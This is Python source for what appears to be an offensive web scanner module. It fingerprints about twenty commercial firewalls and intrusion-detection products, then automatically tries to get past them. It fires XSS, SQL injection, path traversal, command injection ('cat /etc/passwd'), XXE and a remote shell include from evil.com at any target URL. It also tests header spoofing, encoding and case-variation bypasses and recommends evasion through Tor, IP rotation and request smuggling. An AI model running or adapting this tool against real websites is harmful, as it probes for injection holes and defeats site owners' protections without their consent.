#!/usr/bin/env python3
"""
Sayer7 - WAF/IDS Detection Module
Advanced Web Application Firewall and Intrusion Detection System Detection
Author: SayerLinux
GitHub: https://github.com/SaudiLinux
Email: SayerLinux1@gmail.com
"""

import re
import requests
import json
import time
import random
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Tuple, Optional
import dns.resolver
import socket

class WAFDetector:
    """
    Advanced WAF/IDS/IPS Detection System
    Detects and identifies 20+ different security solutions
    """
    
    def __init__(self, request_handler):
        self.request_handler = request_handler
        self.waf_signatures = self._load_waf_signatures()
        self.bypass_payloads = self._load_bypass_payloads()
        
    def _load_waf_signatures(self) -> Dict[str, Dict]:
        """Load WAF/IDS signature database"""
        return {
            "Cloudflare": {
                "headers": ["CF-RAY", "cloudflare", "cf-cache-status"],
                "server": ["cloudflare"],
                "body": ["cloudflare", "ray id", "attention required"],
                "status_codes": [403, 503],
                "block_page": "cloudflare-nginx"
            },
            "AWS WAF": {
                "headers": ["x-amzn-requestid", "x-amz-cf-id"],
                "server": ["AmazonS3", "CloudFront"],
                "body": ["aws waf", "request blocked"],
                "status_codes": [403, 503]
            },
            "Akamai": {
                "headers": ["x-akamai-config-log-detail", "x-akamai-transformed"],
                "server": ["AkamaiGHost"],
                "body": ["akamai", "access denied"],
                "status_codes": [403, 503]
            },
            "Incapsula": {
                "headers": ["x-iinfo", "x-cdn", "visid_incap_"],
                "server": ["Incapsula"],
                "body": ["incapsula", "incident id"],
                "status_codes": [403, 503]
            },
            "Sucuri": {
                "headers": ["x-sucuri-id", "x-sucuri-cache"],
                "server": ["Sucuri/Cloudproxy"],
                "body": ["sucuri", "access denied"],
                "status_codes": [403]
            },
            "ModSecurity": {
                "headers": ["mod_security", "modsecurity"],
                "server": ["Apache", "nginx"],
                "body": ["mod_security", "not acceptable"],
                "status_codes": [403, 406]
            },
            "F5 BIG-IP": {
                "headers": ["x-waf-event-info", "f5-"],
                "server": ["BigIP", "F5-TrafficShield"],
                "body": ["f5", "security policy"],
                "status_codes": [403, 503]
            },
            "Barracuda": {
                "headers": ["x-barracuda"],
                "server": ["Barracuda"],
                "body": ["barracuda", "access denied"],
                "status_codes": [403]
            },
            "Fortinet FortiWeb": {
                "headers": ["x-fortinet", "fortigate"],
                "server": ["FortiWeb", "FortiGate"],
                "body": ["fortinet", "fortigate"],
                "status_codes": [403]
            },
            "Palo Alto": {
                "headers": ["x-palo-alto", "x-pan-app"],
                "server": ["Palo Alto"],
                "body": ["palo alto", "threat prevention"],
                "status_codes": [403]
            },
            "Citrix NetScaler": {
                "headers": ["via", "x-citrix"],
                "server": ["NetScaler", "Citrix"],
                "body": ["citrix", "netscaler"],
                "status_codes": [403]
            },
            "Radware": {
                "headers": ["x-radware", "x-rs-cors"],
                "server": ["Radware"],
                "body": ["radware", "appwall"],
                "status_codes": [403]
            },
            "DenyAll": {
                "headers": ["server", "x-denyall"],
                "server": ["DenyAll"],
                "body": ["denyall", "rweb"],
                "status_codes": [403]
            },
            "Trustwave": {
                "headers": ["x-trustwave", "x-waf"],
                "server": ["Trustwave"],
                "body": ["trustwave", "modsecurity"],
                "status_codes": [403]
            },
            "Imperva": {
                "headers": ["x-iinfo", "x-cdn"],
                "server": ["Imperva"],
                "body": ["imperva", "securesphere"],
                "status_codes": [403, 503]
            },
            "Wordfence": {
                "headers": ["x-wf-sid", "x-wordfence"],
                "server": ["Wordfence"],
                "body": ["wordfence", "blocked"],
                "status_codes": [403]
            },
            "NAXSI": {
                "headers": ["x-data-origin", "x-naxsi"],
                "server": ["nginx-naxsi"],
                "body": ["naxsi", "blocked"],
                "status_codes": [403, 418]
            },
            "DOSarrest": {
                "headers": ["x-dosarrest", "x-dosarrest-id"],
                "server": ["DOSarrest"],
                "body": ["dosarrest", "access denied"],
                "status_codes": [403]
            },
            "BlazingFast": {
                "headers": ["x-blazingfast", "x-cdn"],
                "server": ["BlazingFast"],
                "body": ["blazingfast", "access denied"],
                "status_codes": [403]
            },
            "StackPath": {
                "headers": ["x-stackpath", "server"],
                "server": ["StackPath"],
                "body": ["stackpath", "blocked"],
                "status_codes": [403]
            }
        }
    
    def _load_bypass_payloads(self) -> Dict[str, List[str]]:
        """Load WAF bypass techniques and payloads"""
        return {
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script>al\u0065rt('XSS')</script>",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
            ],
            "sqli": [
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "' AND 1=1--",
                "admin'--",
                "1' OR '1'='1",
                "1' OR 1#",
                "1' OR 1--",
                "1' OR 1/*",
                "1' OR 1;%00",
                "1' OR 1 AND 1=1"
            ],
            "headers": [
                {"X-Forwarded-For": "127.0.0.1"},
                {"X-Real-IP": "127.0.0.1"},
                {"X-Originating-IP": "127.0.0.1"},
                {"X-Remote-IP": "127.0.0.1"},
                {"X-Client-IP": "127.0.0.1"},
                {"X-Forwarded-Host": "localhost"},
                {"X-Host": "localhost"},
                {"Host": "localhost"},
                {"User-Agent": "GoogleBot"},
                {"Referer": "https://www.google.com"}
            ]
        }
    
    def detect_waf(self, url: str, timeout: int = 10) -> Dict[str, any]:
        """
        Comprehensive WAF/IDS detection
        Returns detailed information about detected security solutions
        """
        results = {
            "url": url,
            "detected_wafs": [],
            "bypass_techniques": [],
            "recommendations": [],
            "raw_data": {},
            "confidence": 0
        }
        
        try:
            # Test normal request
            normal_response = self.request_handler.get(url, timeout=timeout)
            if normal_response:
                results["raw_data"]["normal"] = {
                    "status_code": normal_response.status_code,
                    "headers": dict(normal_response.headers),
                    "content_length": len(normal_response.text)
                }
            
            # Test with malicious payloads
            malicious_results = self._test_malicious_payloads(url)
            results["raw_data"]["malicious"] = malicious_results
            
            # Analyze responses for WAF signatures
            waf_detection = self._analyze_waf_signatures(results["raw_data"])
            results["detected_wafs"] = waf_detection["detected"]
            results["confidence"] = waf_detection["confidence"]
            
            # Generate bypass recommendations
            results["bypass_techniques"] = self._generate_bypass_recommendations(results["detected_wafs"])
            
            # Test bypass techniques
            bypass_results = self._test_bypass_techniques(url, results["detected_wafs"])
            results["bypass_results"] = bypass_results
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def _test_malicious_payloads(self, url: str) -> Dict[str, any]:
        """Test various malicious payloads to trigger WAF"""
        results = {}
        
        test_payloads = [
            ("xss", "<script>alert('test')</script>"),
            ("sqli", "' OR 1=1--"),
            ("lfi", "../../../etc/passwd"),
            ("rfi", "http://evil.com/shell.txt"),
            ("cmd", ";cat /etc/passwd"),
            ("xxe", "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>")
        ]
        
        for test_type, payload in test_payloads:
            try:
                # Test in URL parameter
                test_url = f"{url}?test={payload}"
                response = self.request_handler.get(test_url, timeout=5)
                
                if response:
                    results[test_type] = {
                        "status_code": response.status_code,
                        "content_length": len(response.text),
                        "blocked": self._is_blocked_response(response),
                        "response_time": response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
                    }
            except Exception as e:
                results[test_type] = {"error": str(e)}
        
        return results
    
    def _is_blocked_response(self, response) -> bool:
        """Determine if response indicates WAF blocking"""
        if response.status_code in [403, 406, 418, 429, 503]:
            return True
        
        content = response.text.lower()
        block_indicators = [
            "blocked", "forbidden", "access denied", "security", "waf",
            "firewall", "incident", "protection", "suspicious", "malicious"
        ]
        
        return any(indicator in content for indicator in block_indicators)
    
    def _analyze_waf_signatures(self, raw_data: Dict) -> Dict[str, any]:
        """Analyze response data for WAF signatures"""
        detected = []
        confidence = 0
        
        # Check normal response
        if "normal" in raw_data:
            normal = raw_data["normal"]
            waf_match = self._match_waf_signature(normal["headers"], normal.get("content", ""))
            if waf_match:
                detected.append(waf_match)
                confidence += 30
        
        # Check malicious responses
        if "malicious" in raw_data:
            for test_type, result in raw_data["malicious"].items():
                if isinstance(result, dict) and not result.get("error"):
                    if result.get("blocked", False):
                        confidence += 20
                    
                    # Check for WAF signatures in blocked responses
                    if result.get("status_code") in [403, 503]:
                        waf_match = self._match_waf_signature({}, result.get("content", ""))
                        if waf_match and waf_match not in detected:
                            detected.append(waf_match)
                            confidence += 25
        
        return {"detected": detected, "confidence": min(confidence, 100)}
    
    def _match_waf_signature(self, headers: Dict[str, str], content: str = "") -> Optional[str]:
        """Match response against WAF signature database"""
        content_lower = content.lower()
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        
        for waf_name, signatures in self.waf_signatures.items():
            score = 0
            
            # Check headers
            for header_pattern in signatures.get("headers", []):
                for header_name, header_value in headers_lower.items():
                    if header_pattern.lower() in header_name.lower() or header_pattern.lower() in header_value:
                        score += 20
            
            # Check server header
            server = headers_lower.get("server", "")
            for server_pattern in signatures.get("server", []):
                if server_pattern.lower() in server:
                    score += 25
            
            # Check body content
            for body_pattern in signatures.get("body", []):
                if body_pattern.lower() in content_lower:
                    score += 15
            
            if score >= 40:
                return waf_name
        
        return None
    
    def _generate_bypass_recommendations(self, detected_wafs: List[str]) -> List[str]:
        """Generate specific bypass recommendations based on detected WAFs"""
        recommendations = []
        
        bypass_techniques = {
            "Cloudflare": [
                "Use Cloudflare bypass techniques",
                "Try Cloudflare Workers bypass",
                "Use alternative DNS resolution",
                "Attempt cache bypass methods"
            ],
            "AWS WAF": [
                "Use AWS API Gateway bypass",
                "Try different AWS regions",
                "Use Lambda@Edge bypass",
                "Attempt direct IP access"
            ],
            "ModSecurity": [
                "Use encoding bypass (URL encoding, double encoding)",
                "Try case variation bypass",
                "Use comment-based bypass",
                "Attempt HTTP parameter pollution"
            ],
            "Wordfence": [
                "Use WordPress-specific bypass techniques",
                "Try XML-RPC bypass",
                "Use REST API bypass",
                "Attempt direct file access"
            ]
        }
        
        for waf in detected_wafs:
            if waf in bypass_techniques:
                recommendations.extend(bypass_techniques[waf])
        
        # General bypass techniques
        general_techniques = [
            "Use different HTTP methods (POST instead of GET)",
            "Try HTTP/2 or HTTP/3 protocols",
            "Use request smuggling techniques",
            "Attempt header injection bypass",
            "Use different encoding methods",
            "Try fragmented requests",
            "Use different User-Agent strings",
            "Attempt IP rotation",
            "Try Tor network access",
            "Use different proxy chains"
        ]
        
        recommendations.extend(general_techniques)
        return list(set(recommendations))
    
    def _test_bypass_techniques(self, url: str, detected_wafs: List[str]) -> Dict[str, any]:
        """Test various bypass techniques against detected WAFs"""
        results = {
            "techniques_tested": 0,
            "successful_bypasses": [],
            "failed_attempts": []
        }
        
        if not detected_wafs:
            return results
        
        bypass_tests = [
            ("Header Spoofing", self._test_header_spoofing),
            ("Encoding Bypass", self._test_encoding_bypass),
            ("HTTP Method Bypass", self._test_http_method_bypass),
            ("Parameter Pollution", self._test_parameter_pollution),
            ("Case Variation", self._test_case_variation)
        ]
        
        for test_name, test_func in bypass_tests:
            try:
                success = test_func(url)
                results["techniques_tested"] += 1
                
                if success:
                    results["successful_bypasses"].append(test_name)
                else:
                    results["failed_attempts"].append(test_name)
                    
            except Exception as e:
                results["failed_attempts"].append(f"{test_name}: {str(e)}")
        
        return results
    
    def _test_header_spoofing(self, url: str) -> bool:
        """Test bypass via header spoofing"""
        headers_list = self.bypass_payloads["headers"]
        
        for headers in headers_list:
            try:
                response = self.request_handler.get(url, headers=headers, timeout=5)
                if response and response.status_code == 200:
                    return True
            except:
                continue
        
        return False
    
    def _test_encoding_bypass(self, url: str) -> bool:
        """Test bypass via URL encoding"""
        test_payload = "<script>alert('test')</script>"
        encoded_payloads = [
            test_payload.replace("<", "%3C").replace(">", "%3E"),
            test_payload.replace("<", "%253C").replace(">", "%253E"),
            test_payload.upper(),
            test_payload.lower()
        ]
        
        for payload in encoded_payloads:
            try:
                test_url = f"{url}?test={payload}"
                response = self.request_handler.get(test_url, timeout=5)
                if response and response.status_code == 200:
                    return True
            except:
                continue
        
        return False
    
    def _test_http_method_bypass(self, url: str) -> bool:
        """Test bypass via HTTP method variation"""
        methods = ["POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
        
        for method in methods:
            try:
                response = self.request_handler.request(method, url, timeout=5)
                if response and response.status_code == 200:
                    return True
            except:
                continue
        
        return False
    
    def _test_parameter_pollution(self, url: str) -> bool:
        """Test bypass via HTTP parameter pollution"""
        try:
            # Test with parameter pollution
            polluted_url = f"{url}?test=value&test=<script>alert('test')</script>"
            response = self.request_handler.get(polluted_url, timeout=5)
            
            if response and response.status_code == 200:
                return True
        except:
            pass
        
        return False
    
    def _test_case_variation(self, url: str) -> bool:
        """Test bypass via case variation"""
        test_payloads = [
            "<ScRiPt>alert('test')</ScRiPt>",
            "<SCRIPT>alert('test')</SCRIPT>",
            "<script>ALERT('test')</script>",
            "<sCrIpT>alert('test')</ScRiPt>"
        ]
        
        for payload in test_payloads:
            try:
                test_url = f"{url}?test={payload}"
                response = self.request_handler.get(test_url, timeout=5)
                if response and response.status_code == 200:
                    return True
            except:
                continue
        
        return False
    
    def enumerate_security_headers(self, url: str) -> Dict[str, any]:
        """Enumerate security headers and their configurations"""
        results = {
            "url": url,
            "security_headers": {},
            "missing_headers": [],
            "header_analysis": {},
            "recommendations": []
        }
        
        try:
            response = self.request_handler.get(url, timeout=10)
            if not response:
                return results
            
            headers = dict(response.headers)
            
            # Check security headers
            security_headers = {
                "X-Frame-Options": "Clickjacking protection",
                "X-Content-Type-Options": "MIME type sniffing protection",
                "X-XSS-Protection": "XSS protection",
                "Strict-Transport-Security": "HTTPS enforcement",
                "Content-Security-Policy": "Content security policy",
                "Referrer-Policy": "Referrer information control",
                "Permissions-Policy": "Browser feature control",
                "X-Permitted-Cross-Domain-Policies": "Cross-domain policy control",
                "X-Download-Options": "Download protection",
                "Expect-CT": "Certificate transparency enforcement"
            }
            
            for header, description in security_headers.items():
                if header in headers:
                    results["security_headers"][header] = {
                        "value": headers[header],
                        "description": description,
                        "status": "present"
                    }
                else:
                    results["missing_headers"].append({
                        "header": header,
                        "description": description
                    })
            
            # Analyze header configurations
            results["header_analysis"] = self._analyze_header_configs(results["security_headers"])
            
            # Generate recommendations
            results["recommendations"] = self._generate_header_recommendations(results)
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def _analyze_header_configs(self, security_headers: Dict) -> Dict[str, any]:
        """Analyze security header configurations for weaknesses"""
        analysis = {}
        
        for header, config in security_headers.items():
            value = config["value"].lower()
            
            if header == "X-Frame-Options":
                if value == "deny":
                    analysis[header] = {"status": "secure", "note": "Strongest protection"}
                elif value == "sameorigin":
                    analysis[header] = {"status": "moderate", "note": "Allows same-origin framing"}
                else:
                    analysis[header] = {"status": "weak", "note": "May allow clickjacking"}
            
            elif header == "Content-Security-Policy":
                if "unsafe-inline" in value or "unsafe-eval" in value:
                    analysis[header] = {"status": "weak", "note": "Contains unsafe directives"}
                else:
                    analysis[header] = {"status": "secure", "note": "Strong CSP configuration"}
            
            elif header == "Strict-Transport-Security":
                if "max-age=0" in value:
                    analysis[header] = {"status": "weak", "note": "HSTS disabled"}
                elif "max-age" in value and int(re.search(r'max-age=(\d+)', value).group(1)) < 31536000:
                    analysis[header] = {"status": "moderate", "note": "Short HSTS duration"}
                else:
                    analysis[header] = {"status": "secure", "note": "Strong HSTS configuration"}
        
        return analysis
    
    def _generate_header_recommendations(self, results: Dict) -> List[str]:
        """Generate security header recommendations"""
        recommendations = []
        
        if results["missing_headers"]:
            for missing in results["missing_headers"]:
                recommendations.append(f"Add {missing['header']} for {missing['description']}")
        
        for header, analysis in results["header_analysis"].items():
            if analysis["status"] == "weak":
                recommendations.append(f"Strengthen {header} configuration: {analysis['note']}")
        
        return recommendations
    
    def detect_dos_protection(self, url: str) -> Dict[str, any]:
        """Detect DoS/DDoS protection mechanisms"""
        results = {
            "url": url,
            "dos_protection": {
                "rate_limiting": False,
                "challenge_pages": [],
                "captcha_detection": False,
                "js_challenge": False,
                "connection_limits": False
            },
            "testing_results": {}
        }
        
        try:
            # Test rate limiting
            rate_limit_test = self._test_rate_limiting(url)
            results["testing_results"]["rate_limiting"] = rate_limit_test
            results["dos_protection"]["rate_limiting"] = rate_limit_test["detected"]
            
            # Test challenge pages
            challenge_test = self._test_challenge_pages(url)
            results["testing_results"]["challenge_pages"] = challenge_test
            results["dos_protection"].update(challenge_test["detection"])
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def _test_rate_limiting(self, url: str) -> Dict[str, any]:
        """Test for rate limiting protection"""
        results = {"detected": False, "response_times": [], "blocked_requests": 0}
        
        try:
            # Send 10 rapid requests
            for i in range(10):
                start_time = time.time()
                response = self.request_handler.get(url, timeout=5)
                end_time = time.time()
                
                if response:
                    results["response_times"].append(end_time - start_time)
                    if response.status_code in [429, 503]:
                        results["blocked_requests"] += 1
                
                time.sleep(0.5)  # Small delay between requests
            
            # Analyze rate limiting
            if results["blocked_requests"] > 0:
                results["detected"] = True
            
            # Check for increasing response times
            if len(results["response_times"]) > 1:
                avg_time = sum(results["response_times"]) / len(results["response_times"])
                max_time = max(results["response_times"])
                if max_time > avg_time * 2:
                    results["detected"] = True
        
        except Exception:
            pass
        
        return results
    
    def _test_challenge_pages(self, url: str) -> Dict[str, any]:
        """Test for challenge pages and CAPTCHA detection"""
        results = {
            "detection": {
                "captcha_detection": False,
                "js_challenge": False,
                "challenge_pages": []
            },
            "challenge_types": []
        }
        
        try:
            # Test with suspicious User-Agent
            headers = {"User-Agent": "curl/7.68.0"}
            response = self.request_handler.get(url, headers=headers, timeout=10)
            
            if response:
                content = response.text.lower()
                
                # Check for CAPTCHA indicators
                captcha_indicators = [
                    "captcha", "recaptcha", "hcaptcha", "verify you're human",
                    "security check", "prove you're human"
                ]
                
                for indicator in captcha_indicators:
                    if indicator in content:
                        results["detection"]["captcha_detection"] = True
                        results["challenge_types"].append("CAPTCHA")
                        break
                
                # Check for JavaScript challenges
                js_indicators = [
                    "javascript is required", "enable javascript",
                    "checking your browser", "security check in progress"
                ]
                
                for indicator in js_indicators:
                    if indicator in content:
                        results["detection"]["js_challenge"] = True
                        results["challenge_types"].append("JavaScript Challenge")
                        break
                
                # Check for specific challenge pages
                if response.status_code == 403 or "challenge" in content:
                    results["detection"]["challenge_pages"].append(response.url)
        
        except Exception:
            pass
        
        return results
    
    def generate_waf_report(self, target_url: str) -> Dict[str, any]:
        """Generate comprehensive WAF/IDS detection report"""
        report = {
            "target": target_url,
            "scan_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "waf_detection": self.detect_waf(target_url),
            "security_headers": self.enumerate_security_headers(target_url),
            "dos_protection": self.detect_dos_protection(target_url),
            "summary": {
                "risk_level": "unknown",
                "protection_level": "unknown",
                "bypass_feasibility": "unknown"
            }
        }
        
        # Generate summary
        waf_count = len(report["waf_detection"]["detected_wafs"])
        missing_headers = len(report["security_headers"]["missing_headers"])
        
        if waf_count == 0:
            report["summary"]["risk_level"] = "low"
            report["summary"]["protection_level"] = "minimal"
            report["summary"]["bypass_feasibility"] = "high"
        elif waf_count <= 2:
            report["summary"]["risk_level"] = "medium"
            report["summary"]["protection_level"] = "moderate"
            report["summary"]["bypass_feasibility"] = "medium"
        else:
            report["summary"]["risk_level"] = "high"
            report["summary"]["protection_level"] = "strong"
            report["summary"]["bypass_feasibility"] = "low"
        
        return report